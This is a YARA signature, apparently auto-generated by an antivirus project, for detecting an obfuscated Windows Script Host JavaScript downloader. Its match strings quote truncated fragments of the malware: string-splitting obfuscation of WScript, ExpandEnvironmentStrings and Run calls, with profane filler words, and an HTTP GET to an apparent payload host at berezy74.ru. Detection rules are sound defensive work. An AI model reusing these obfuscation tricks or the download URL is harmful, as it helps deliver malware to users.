rule sig_20160428_51e21e817b7b8c1f62cd7c6a0c7b1d53 {
  meta:
    description = "datamaliciousorder - file 20160428_51e21e817b7b8c1f62cd7c6a0c7b1d53.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "156db5ef317028b411c3f257f062d7f5940f5575142747e3daf961a9430c8cee"

  strings:
    $s1  = "function KtsKwiAwgOqmOktFryGtm(FsvFwlOzrZxpHwzQheWgf){YqeGzyLguWoeZjxWgmAfc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function MvlMcjWmaCjiWkaYgaAib() {return YqeGzyLguWoeZjxWgmAfc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function KtsKwiAwgOqmOktFryGtm(FsvFwlOzrZxpHwzQheWgf){YqeGzyLguWoeZjxWgmAfc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function PcxCzkKqhTuvZltCnaOtm(FkuIalUplLxcZlbDbpKdh, CqbHyyBwoKndRsfNyzEcq){YnqDzfWpxQqfPdqXbuFiv = YnqDzfWpxQqfPdqXbuFiv * 1; " ascii
    $s5  = "var YqeGzyLguWoeZjxWgmAfc = function NbdRotTlfYnhYhoHwrZah() {return WweXoxIfvRlsXmaRyaHmo[MrjRfcOvgFohJdgFvoTbd](\"WScript\"+\"" ascii
    $s6  = "return FkuIalUplLxcZlbDbpKdh - CqbHyyBwoKndRsfNyzEcq;};" fullword ascii
    $s7  = "IabGpvSunBbqWfaAzoBag[MfmBnqOnzWepJgkDrbZpo](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s8  = "var WweXoxIfvRlsXmaRyaHmo = this[\"WScript\"];" fullword ascii
    $s9  = "var YqeGzyLguWoeZjxWgmAfc = function NbdRotTlfYnhYhoHwrZah() {return WweXoxIfvRlsXmaRyaHmo[MrjRfcOvgFohJdgFvoTbd](\"WScript\"+\"" ascii
    $s10 = "function MvlMcjWmaCjiWkaYgaAib() {return YqeGzyLguWoeZjxWgmAfc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function HkzZjsUqiJzoKhdIszEye()" fullword ascii
    $s12 = "function YgrNqrKtuSivHabGaeQti(){return TosJirZclFgaNmaVkbWdg + \"\";};" fullword ascii
    $s13 = "if (IabGpvSunBbqWfaAzoBag[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function PcxCzkKqhTuvZltCnaOtm(FkuIalUplLxcZlbDbpKdh, CqbHyyBwoKndRsfNyzEcq){YnqDzfWpxQqfPdqXbuFiv = YnqDzfWpxQqfPdqXbuFiv * 1; " ascii
    $s15 = "function FfaAoiSxbRtaCpjBwmYsq() {return ((UhzLshTkvMjvStwRjaNiw == true) && (UhzLshTkvMjvStwRjaNiw == JsfUayTiiJgoYjdSixTnw)) ?" ascii
    $s16 = "function FfaAoiSxbRtaCpjBwmYsq() {return ((UhzLshTkvMjvStwRjaNiw == true) && (UhzLshTkvMjvStwRjaNiw == JsfUayTiiJgoYjdSixTnw)) ?" ascii
    $s17 = "function KxdTbyLtbYvrFsdTrlCyu(LpqVhzBtlHwxAgpRpvBeb) {var FbxGbyFwdUpoGxtYuiLte = (1, 2, 3, 4, 5, LpqVhzBtlHwxAgpRpvBeb); retur" ascii
    $s18 = "return PcxCzkKqhTuvZltCnaOtm(1 == 1 ? ItmXzgZavFymXmsRqzWcv : 0, 1 == 1 ? HvaZxpCoqPtxKzaCcyHos : 0);" fullword ascii
    $s19 = "function TigUhsMluPqyClaEocHrt(){return 23;};" fullword ascii
    $s20 = "function KxdTbyLtbYvrFsdTrlCyu(LpqVhzBtlHwxAgpRpvBeb) {var FbxGbyFwdUpoGxtYuiLte = (1, 2, 3, 4, 5, LpqVhzBtlHwxAgpRpvBeb); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}